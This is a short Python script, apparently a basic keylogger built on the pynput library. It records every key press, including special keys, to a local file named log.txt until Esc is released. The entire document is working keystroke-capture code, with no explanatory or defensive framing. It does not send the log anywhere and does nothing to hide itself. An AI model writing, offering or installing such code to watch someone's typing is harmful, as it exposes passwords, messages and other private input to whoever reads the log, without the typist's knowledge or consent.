from pynput.keyboard import Listener

def on_press(key):
    try:
        with open('log.txt', 'a') as file:
            file.write(str(key.char))
    except AttributeError:
        if key == key.space:
            with open('log.txt', 'a') as file:
                file.write(' ')
        else:
            with open('log.txt', 'a') as file:
                file.write(' [' + str(key) + '] ')

def on_release(key):
    if key == key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
